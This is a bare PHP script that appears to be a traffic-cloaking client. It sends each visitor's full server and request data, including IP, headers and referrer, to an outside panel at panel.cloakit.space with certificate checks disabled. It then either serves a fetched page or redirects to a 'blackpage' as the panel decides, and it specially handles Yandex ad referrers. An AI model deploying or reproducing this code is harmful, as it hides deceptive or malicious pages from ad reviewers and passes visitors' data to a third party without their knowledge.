<?php
$mainserver = 'https://panel.cloakit.space/';

if (isset($_SERVER['HTTP_REFERER'])) {if (stristr($_SERVER['HTTP_REFERER'], 'yabs.yandex')) {
    $_SERVER['HTTP_REFERER'] = 'yabs.yandex';
}}

$data = array(
   '_server' => json_encode($_SERVER),
   'user' => 'a53e3b07084a304728cb2ddc0fee1c88',
   'company' => '8773'
);
$ch = curl_init();
$optArray = array(
    CURLOPT_URL => $mainserver.'connect_v2',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => $data
);

curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
$responses = json_decode($result, true);
if ($_SERVER['QUERY_STRING']!='') {
  $responses['oldpage'] = $responses['page'];
  $responses['page'] = $responses['page'].'?'.$_SERVER['QUERY_STRING'];
}
else {
  $responses['oldpage'] = $responses['page'];
}

$arrContextOptions=array(
    'ssl'=>array(
        'verify_peer'=>false,
        'verify_peer_name'=>false,
    ),
    'http' => array(
        'header' => 'User-Agent: '.$responses['user_agent']
    )
);

if ($responses['mode']=='load') {
  $html = file_get_contents($responses['page'], false, stream_context_create($arrContextOptions));
  $html = str_replace('<head>', '<head><base href="'.$responses['oldpage'].'" />', $html);
  echo $html;
}
else if ($responses['mode']=='redirect') {
  if ($responses['type']=='blackpage') {
    header('Location: '.$responses['page']);
  }
  else {
    $html = file_get_contents($responses['page'], false, stream_context_create($arrContextOptions));
    $html = str_replace('<head>', '<head><base href="'.$responses['oldpage'].'" />', $html);
    echo $html;
  }
}
?>